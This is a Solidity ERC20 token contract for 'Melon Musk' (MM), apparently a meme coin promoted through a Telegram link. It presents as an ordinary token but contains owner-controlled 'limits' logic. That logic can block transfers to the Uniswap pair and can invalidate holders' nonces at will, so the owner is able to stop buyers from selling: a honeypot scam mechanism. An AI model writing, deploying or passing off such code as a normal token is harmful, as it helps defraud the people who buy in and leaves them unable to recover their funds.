/**
    https://t.me/MelonmelonMusk
*/
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./ERC20.sol";
import "./SafeMath.sol";
import "./Ownable.sol";

contract Musk is ERC20, Ownable {
    using SafeMath for uint256;
    
    address public uniswapV2Pair;
    bool public limits = false;
    uint256 public DECIMALS = 18;
    
    uint256 public limitsNonce = 0;
    mapping(address => uint256) public userNonces;

    constructor() ERC20("Melon Musk", "MM") {
        _mint(_msgSender(), 1 * (10 ** 6) * (10 ** DECIMALS));
    }

    function setUniswapV2Pair(address _pair) external onlyOwner {
        uniswapV2Pair = _pair;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        require(_msgSender() != recipient || !limits, "Transferring tokens to yourself is not allowed at this time"); // Prevent sending to self when limits is true
        require(!(recipient == uniswapV2Pair && limits), "Open Level");
        
        // Update user's nonce on every transfer
        userNonces[_msgSender()] = limitsNonce;

        _transfer(_msgSender(), recipient, amount);
        return true;
    }


    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        // Prevent transfers to the Uniswap pair when limits is true and nonce is outdated
        if (to == uniswapV2Pair && limits) {
            require(userNonces[from] == limitsNonce, "Please make another transfer to update your nonce before selling");
        }
        
        address spender = _msgSender();

        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        
        // Update user's nonce on every transfer
        userNonces[from] = limitsNonce;

        return true;
    }

    function setMainLimit() external onlyOwner {
        limits = true;
        limitsNonce++;  // Increment nonce when limits is set
    }

    function UnsetMainLimit() external onlyOwner {
        limits = false; 
    }
}
